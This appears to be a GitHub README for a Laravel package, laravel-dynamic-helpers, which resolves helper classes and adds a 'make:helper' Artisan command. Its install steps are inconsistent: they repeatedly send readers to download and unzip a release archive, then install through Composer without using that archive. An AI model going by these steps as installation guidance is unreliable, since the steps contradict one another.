# 🎉 laravel-dynamic-helpers - Effortlessly Manage Your Laravel Helpers

[![Download](https://img.shields.io/badge/Download-laravel--dynamic--helpers-blue.svg)](https://github.com/Harmanmehra/laravel-dynamic-helpers/releases)

## 📋 Description

Laravel Dynamic Helpers is a package that simplifies the management of helper classes in your Laravel applications. It automatically resolves helper classes and provides an Artisan command to generate custom helpers in your `app/Helpers` directory. This way, you can streamline your development process and focus on what truly matters: building great applications.

## 🚀 Getting Started

To get started with Laravel Dynamic Helpers, follow these steps:

1. **Visit the Releases Page**: Click the link below to access the download page where you can find the latest version of the package.

   [Download from Releases](https://github.com/Harmanmehra/laravel-dynamic-helpers/releases)

2. **Download the Latest Version**: Look for the most recent release and download the package compatible with your environment.

3. **Unzip the Package**: After downloading, unzip the package to a folder on your computer.

4. **Install the Package**: Open your terminal and navigate to your Laravel project directory. You can use the following command to include the package via Composer (make sure you have Composer installed):
   ```
   composer require harmanmehra/laravel-dynamic-helpers
   ```

5. **Configure the Package**: If necessary, you can publish the configuration file using the Artisan command:
   ```
   php artisan vendor:publish --provider="Harmanmehra\DynamicHelpers\DynamicHelpersServiceProvider"
   ```

## 📥 Download & Install

To download and install Laravel Dynamic Helpers, head over to the Releases page. Follow these steps:

1. **Visit This Page**: Click the link below to go to the releases page.

   [Download from Releases](https://github.com/Harmanmehra/laravel-dynamic-helpers/releases)

2. **Select the Version**: Choose the version you want to install.

3. **Follow the Installation Instructions**: Follow the previous instructions outlined under "Getting Started" to successfully add the package to your project.

## 🚑 System Requirements

Before installing, ensure that your system meets the following requirements:

- **PHP Version**: At least PHP 7.2 or newer.
- **Laravel Version**: Compatible with Laravel 6.x and newer.
- **Composer**: Make sure you have Composer installed to manage your dependencies.

## 📚 Features

Laravel Dynamic Helpers includes the following features:

- **Dynamic Resolution**: Automatically resolves helper classes as needed.
- **Easy Management**: Generate custom helpers without manual coding in your `app/Helpers` directory.
- **Artisan Command**: Convenient Artisan command for generating helpers quickly.
- **Zero Configuration**: Simply install and start using it without complex setups.

## 🔧 Usage

After installation, you can use the package by creating helper files. To create a new helper file, use the following command:

```
php artisan make:helper MyCustomHelper
```

This command creates a new file named `MyCustomHelper.php` in your `app/Helpers` directory. You can then define any helper functions you need within this file.

## 🤝 Support

For any questions or issues, please check the [Issues](https://github.com/Harmanmehra/laravel-dynamic-helpers/issues) section of the repository. You can also submit a new issue if you encounter problems or have suggestions.

## 📅 Contributions

Contributions are welcome! If you wish to contribute to this project, please fork the repository and submit a pull request. Before doing so, please ensure that your code adheres to the existing coding standards.

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](https://github.com/Harmanmehra/laravel-dynamic-helpers/blob/main/LICENSE) file for details. 

## 💬 Acknowledgments

Thank you to the Laravel community for their support and to all the contributors who help make Laravel Dynamic Helpers a better tool. 

Now you are ready to enjoy Laravel Dynamic Helpers and make your helper management effortless!